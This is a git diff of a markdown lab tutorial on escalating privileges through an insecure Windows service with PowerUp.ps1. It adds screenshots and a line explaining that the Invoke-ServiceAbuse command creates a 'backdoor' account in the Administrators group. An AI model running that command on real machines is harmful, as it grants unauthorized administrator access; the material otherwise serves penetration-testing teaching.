@@ -64,17 +64,19 @@ An insecure Windows service is one that can be easily exploited by a Penetration
    ```
    Get-ModifiableServiceFile
    ```
+   ![image](https://github.com/user-attachments/assets/feae3244-f468-4ed4-9291-5c0577399d78)
    To check for service permissions, run
    ```
    Get-ServiceDetail -Name "InsecureService"
    ```
+   ![image](https://github.com/user-attachments/assets/0eac43ee-4c4c-4b1c-912e-1c83602d4468)
 5. To exploit the insecure service with PowerUp.ps1, run
    ```
    Invoke-ServiceAbuse -Name InsecureService -UserName backdoor -Password password -LocalGroup "Administrators"
    ```
+   This will create a backdoor account that will be added to the Administrators group
    ![image](https://github.com/user-attachments/assets/91ff8a40-2655-4b24-839c-078322e14293)
 6. To delete the insecure service in PowerShell, use
    ```
    sc.exe delete InsecureService
    ```
-7. 
